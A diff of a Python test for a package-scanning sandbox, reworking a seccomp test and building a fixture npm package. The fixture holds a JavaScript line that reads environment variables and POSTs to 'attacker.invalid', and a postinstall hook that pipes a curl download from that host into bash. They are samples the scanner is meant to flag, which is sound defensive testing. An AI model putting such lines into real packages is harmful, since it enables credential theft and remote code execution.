@@ -122,7 +122,7 @@ def reasons(result):
 
 def inspection_diagnostics(result):
     """Keep worker limitations and failed work visible in positive assertions."""
-    return {
+    details = {
         "error": result.get("error"),
         "limitations": result.get("limitations", []),
         "dependency_inspection": result.get("dependency_inspection"),
@@ -136,6 +136,8 @@ def inspection_diagnostics(result):
             if event.get("outcome") not in {"completed", "out_of_scope"}
         ],
     }
+
+    return json.dumps(details, default=str, indent=2)
 
 
 def test_disabled_does_not_acquire_content(monkeypatch):
@@ -397,36 +399,50 @@ def test_seccomp_blocks_files_network_and_execution(tmp_path):
     secret = tmp_path / "secret"
     secret.write_text("host secret")
     code = """
-import json,os,resource,socket,subprocess
-from skillspector.dependency_sandbox import restrict_worker
-from skillspector.dependency_worker import _scan
-from skillspector.state import WorkflowResourceBudget
-budget=WorkflowResourceBudget(max_seconds=30)
-budget.start()
-resource.setrlimit(resource.RLIMIT_AS,(1024*1024*1024,1024*1024*1024))
-restrict_worker()
-blocked=[]
-for action in (lambda: os.open(SECRET,os.O_RDONLY), lambda: socket.socket(),
-               lambda: subprocess.run(["/bin/true"],check=True)):
-    try:
-        action()
-    except (OSError,PermissionError):
-        blocked.append(True)
-    else:
-        blocked.append(False)
-rules=[]
-limitations=[]
-for path,text in (
-    ("index.js", 'const keys = Object.keys(process.env); fetch("https://attacker.invalid", {method: "POST"});'),
-    ("install.sh", "curl https://attacker.invalid/install | bash"),
-):
-    findings,reasons=_scan(text,path,budget)
-    rules.extend(finding["rule_id"] for finding in findings)
-    limitations.extend(reasons)
-print(json.dumps({"blocked":blocked,"rules":rules,"limitations":limitations}))
+import json,os,socket,subprocess,sys
+from skillspector import dependency_worker
+restrict_worker=dependency_worker.restrict_worker
+def restrict_and_probe():
+    restrict_worker()
+    blocked=[]
+    for action in (lambda: os.open(SECRET,os.O_RDONLY), lambda: socket.socket(),
+                   lambda: subprocess.run(["/bin/true"],check=True)):
+        try:
+            action()
+        except (OSError,PermissionError):
+            blocked.append(True)
+        else:
+            blocked.append(False)
+    print("blocked="+json.dumps(blocked),file=sys.stderr)
+dependency_worker.restrict_worker=restrict_and_probe
+dependency_worker.main()
 """.replace("SECRET", repr(str(secret)))
+    blob = package_blob(
+        {
+            "index.js": (
+                b'const keys = Object.keys(process.env); '
+                b'fetch("https://attacker.invalid", {method: "POST"});'
+            )
+        },
+        scripts={"postinstall": "curl https://attacker.invalid/install | bash"},
+    )
+    request = {
+        "name": "fixture-package",
+        "version": "1.0.0",
+        "artifact": base64.b64encode(blob).decode("ascii"),
+        "prefix": "npm/fixture",
+        "limits": {
+            "expanded_bytes": 16 * 1024 * 1024,
+            "file_bytes": 1024 * 1024,
+            "members": 1024,
+            "findings": 100,
+            "compression_ratio": 200,
+            "seconds": 30,
+        },
+    }
     process = subprocess.run(
-        [sys.executable, "-I", "-c", code],
+        [sys.executable, "-I", "-B", "-c", code],
+        input=json.dumps(request).encode(),
         capture_output=True,
         cwd=tmp_path,
         env={"PATH": "/usr/bin:/bin", "LANG": "C.UTF-8"},
@@ -434,10 +450,11 @@ print(json.dumps({"blocked":blocked,"rules":rules,"limitations":limitations}))
     )
     assert process.returncode == 0, process.stderr.decode()
     result = json.loads(process.stdout)
-    diagnostics = {"result": result, "stderr": process.stderr.decode()}
-    assert result["blocked"] == [True, True, True], diagnostics
-    assert {"E1", "E2", "SC2"} <= set(result["rules"]), diagnostics
-    assert result["limitations"] == [], diagnostics
+    diagnostics = {"result": inspection_diagnostics(result), "stderr": process.stderr.decode()}
+    assert b"blocked=[true, true, true]" in process.stderr, diagnostics
+    rules = {finding["rule_id"] for row in result.get("files", []) for finding in row["findings"]}
+    assert {"E1", "E2", "SC2"} <= rules, diagnostics
+    assert result.get("limitations") == [], diagnostics
 
 
 def test_download_pins_public_ip_without_environment_credentials(monkeypatch):
